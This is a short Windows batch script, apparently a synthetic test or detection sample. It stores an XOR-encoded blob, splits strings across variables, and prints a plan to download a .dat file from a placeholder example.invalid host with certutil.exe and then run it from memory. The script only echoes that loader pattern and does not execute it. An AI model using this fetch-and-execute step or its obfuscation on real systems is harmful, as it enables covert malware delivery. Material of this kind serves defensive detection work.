@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:decimal_bytes|xor_5a
rem HUNTRESS-MATERIAL:44.103.107.38.41.46.63.42.41.103.59.57.43.47.51.40.63.5.40.63.55.53.46.63.118.62.51.41.42.59.46.57.50.5.55.63.55.53.40.35.38.59.62.59.42.46.63.40.103.57.63.40.46.47.46.51.54.116.63.34.63.38.41.46.59.61.63.5.57.53.47.52.46.103.107.38.61.40.59.42.50.103.60.59.52.5.53.47.46.38.52.63.34.46.5.54.59.52.61.47.59.61.63.103.52.53.52.63.38.57.59.55.42.59.51.61.52.5.51.62.103.57.59.55.42.59.51.61.52.119.110.108.107.59.62.59.105.56.99.63.38.47.40.54.103.50.46.46.42.41.96.117.117.110.108.107.59.62.59.105.56.99.63.116.63.34.59.55.42.54.63.116.51.52.44.59.54.51.62.117.109.106.106.56.105.110.56.62.116.62.59.46
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set item0=v=1^|steps=acquire_remote,dispatch_memory^|adapter
set item1==certutil.exe^|stage_count=1^|graph=fan_out^|next_l
set item2=anguage=none^|campaign_id=campaign-461ada3b9e^|url
set item3==https://461ada3b9e.example.invalid/700b34bd.dat
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_dead_label=d1f77c21"
goto :HUNTRESS_DISPATCH
:HUNTRESS_DISPATCH
set "item9=!item0!!item1!!item2!!item3!"
echo(!item9!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo certutil.exe GET https://461ada3b9e.example.invalid/700b34bd.dat then dispatch memory
exit /b 0
